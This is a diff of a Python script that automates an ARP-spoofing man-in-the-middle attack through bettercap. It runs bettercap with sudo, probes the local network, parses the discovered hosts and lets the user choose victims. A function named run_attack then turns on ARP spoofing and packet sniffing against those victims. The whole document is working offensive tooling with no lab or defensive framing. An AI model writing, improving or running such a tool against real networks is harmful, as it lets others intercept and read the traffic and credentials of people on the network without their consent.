@@ -2,66 +2,118 @@ import subprocess
 import sys
 import time
 import threading
+import re
 
-def main():
-    if len(sys.argv) < 2:
-        print(f"Usage: python {sys.argv[0]} <network_interface>")
-        sys.exit(1)
-    iface = sys.argv[1]
-
-    # Start bettercap process
+def start_bettercap(iface):
     print(f"[*] Starting bettercap on interface {iface}...")
-    proc = subprocess.Popen(
-        ["bettercap", "-iface", iface],
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True,
-        bufsize=1
+    try:
+        proc = subprocess.Popen(
+            ["sudo", "bettercap", "-iface", iface],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+        time.sleep(2)
+        return proc
+    except FileNotFoundError:
+        print("[!] Error: 'bettercap' command not found. Make sure it's installed and in your PATH.")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[!] An error occurred while starting bettercap: {e}")
+        sys.exit(1)
+
+def parse_bettercap_table(output_lines):
+    # Matches table row: │ IP │ MAC │ NAME │ VENDOR │ ...
+    # Captures only device rows
+    device_line_re = re.compile(
+        r"^\s*│\s*([\d\.]+)\s*│\s*([0-9a-fA-F:]+)\s*│\s*([^│]*?)\s*│\s*([^│]*?)\s*│"
     )
+    devices = []
+    for line in output_lines:
+        match = device_line_re.match(line)
+        if match:
+            ip, mac, name, vendor = match.groups()
+            devices.append({
+                "ip": ip.strip(),
+                "mac": mac.strip(),
+                "name": name.strip() if name.strip() else "N/A",
+                "vendor": vendor.strip() if vendor.strip() else "N/A"
+            })
+    return devices
 
-    def send(cmd):
-        proc.stdin.write(cmd + "\n")
-        proc.stdin.flush()
-
-    # Step 1: net.probe on
-    send("net.probe on")
-    print("[*] Sent 'net.probe on'. Waiting for devices to be discovered (30 seconds)...")
-    time.sleep(30)
-
-    # Step 2: net.show
-    send("net.show")
-    print("\n[*] Output of 'net.show':\n")
-
-    # Read output in a separate thread until user presses Enter
-    stop_reading = False
+def discover_devices(proc):
+    devices = []
+    output_lines = []
+    stop_reading = threading.Event()
 
     def read_output():
-        while not stop_reading:
+        while not stop_reading.is_set():
             line = proc.stdout.readline()
-            if not line:
-                break
-            print(line, end="")
+            if line:
+                print(line, end='')
+                output_lines.append(line)
 
     t = threading.Thread(target=read_output)
     t.start()
 
-    input("\n[*] Press Enter when you are ready to continue...")
+    proc.stdin.write("net.probe on\n")
+    proc.stdin.flush()
+    print("[*] Device discovery started. Let it run for a bit to find devices...")
+    input("[*] Press Enter when you are ready to see the list of discovered devices...\n")
+    proc.stdin.write("net.probe off\n")
+    proc.stdin.flush()
+    time.sleep(1)
+    proc.stdin.write("net.show\n")
+    proc.stdin.flush()
+    time.sleep(2)
 
-    stop_reading = True
-    t.join(timeout=2)
+    stop_reading.set()
+    t.join()
 
-    # Step 3: ask user for ARP spoof options
-    fullduplex = input("\nEnter fullduplex value (true/false): ").strip().lower()
-    target_ip = input("Enter target IP: ").strip()
+    print("\n--- Parsing Discovered Devices ---")
+    devices = parse_bettercap_table(output_lines)
+    if not devices:
+        print("[!] No devices were found. Exiting.")
+        proc.terminate()
+        sys.exit(1)
+    return devices
 
-    # Step 4: execute arp spoof commands
-    send(f"set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {target_ip}; arp.spoof on")
-    print(f"\n[*] Sent: set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {target_ip}; arp.spoof on\n")
-    send(f"net.sniff on")
-    print("[*] You are now in the interactive bettercap session. Press Ctrl+C to exit.")
+def get_user_choices(devices):
+    print("\n[+] Discovered Devices:")
+    for i, device in enumerate(devices):
+        print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']:<17} Name: {device.get('name', 'N/A')}")
+    while True:
+        try:
+            target_indices_str = input("\n[*] Enter the number(s) of the target(s) (e.g., 0 or 1,3): ")
+            target_indices = [int(i.strip()) for i in target_indices_str.split(',')]
+            if all(0 <= index < len(devices) for index in target_indices):
+                selected_ips = [devices[i]['ip'] for i in target_indices]
+                targets_str = ",".join(selected_ips)
+                break
+            else:
+                print("[!] Invalid selection. Please enter number(s) from the list above.")
+        except ValueError:
+            print("[!] Invalid input. Please enter numbers only.")
+    while True:
+        choice = input("[*] Enable full-duplex ARP spoofing? (y/n): ").strip().lower()
+        if choice in ['y', 'yes']:
+            fullduplex = "true"
+            break
+        elif choice in ['n', 'no']:
+            fullduplex = "false"
+            break
+        else:
+            print("[!] Invalid choice. Please enter 'y' or 'n'.")
+    return targets_str, fullduplex
 
-    # Attach to bettercap process (interactive)
+def run_attack(proc, targets, fullduplex):
+    command = f"set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {targets}; arp.spoof on; net.sniff on"
+    print(f"\n[+] Executing command: {command}")
+    proc.stdin.write(command + "\n")
+    proc.stdin.flush()
+    print("\n[***] ARP spoofing and sniffing started! Press Ctrl+C to exit. [***]")
     try:
         while True:
             line = proc.stdout.readline()
@@ -69,8 +121,28 @@ def main():
                 break
             print(line, end="")
     except KeyboardInterrupt:
-        print("\nExiting...")
+        print("\n[*] Stopping bettercap and exiting...")
         proc.terminate()
+    except Exception as e:
+        print(f"\n[!] An error occurred: {e}")
+        proc.terminate()
+
+def main():
+    if len(sys.argv) < 2:
+        print(f"Usage: python {sys.argv[0]} <network_interface>")
+        sys.exit(1)
+    iface = sys.argv[1]
+    proc = start_bettercap(iface)
+    if not proc:
+        print("[!] Failed to start bettercap. Exiting.")
+        sys.exit(1)
+    devices = discover_devices(proc)
+    if not devices:
+        print("[!] No devices found. Exiting.")
+        proc.terminate()
+        sys.exit(1)
+    targets, fullduplex = get_user_choices(devices)
+    run_attack(proc, targets, fullduplex)
 
 if __name__ == "__main__":
     main()
